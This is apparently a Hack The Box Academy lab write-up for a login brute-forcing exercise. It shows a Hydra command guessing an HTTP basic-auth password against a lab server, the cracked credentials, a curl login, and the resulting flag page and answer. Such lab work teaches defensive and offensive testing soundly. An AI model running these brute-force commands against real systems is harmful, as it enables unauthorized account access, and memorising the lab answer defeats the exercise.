# Section 07: Basic HTTP Authentication

Module: 16. Login Brute Forcing

---

## Questions & Answers

### 1. After successfully brute-forcing, and then logging into the target, what is the full flag you find?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-hfzkdvfmgy-htb-cloud-com]─[~]
└──╼ [★]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.68 http-get / -s 32582
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-07 03:56:52
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://154.57.164.68:32582/
[32582][http-get] host: 154.57.164.68   login: basic-auth-user   password: Password@123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-07 03:56:55
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-hfzkdvfmgy-htb-cloud-com]─[~]
└──╼ [★]$ curl -u "basic-auth-user:Password@123" http://154.57.164.68:32582
<!DOCTYPE html>
<html>

<head>
    <title>Flag</title>
    <style>
        body {
            font-family: monospace;
            /* Use a monospace font for the flag */
            text-align: center;
            background-color: #222;
            /* Dark background */
            color: #0f0;
            /* Green text */
        }

        h1 {
            margin-top: 20%;
            /* Add some top margin */
        }

        .flag {
            font-size: 2em;
            /* Make the flag larger */
            background-color: #000;
            /* Black background for the flag */
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
            /* Make it behave like an inline element */
        }
    </style>
</head>

<body>
    <h1>Congratulations!</h1>
    <p>You found the flag: <span class="flag">HTB{th1s_1s_4_f4k3_fl4g}</span></p>
</body>

</html>
```

**Answer:** `HTB{th1s_1s_4_f4k3_fl4g}`

---

[Back to Module Index](./README.md)
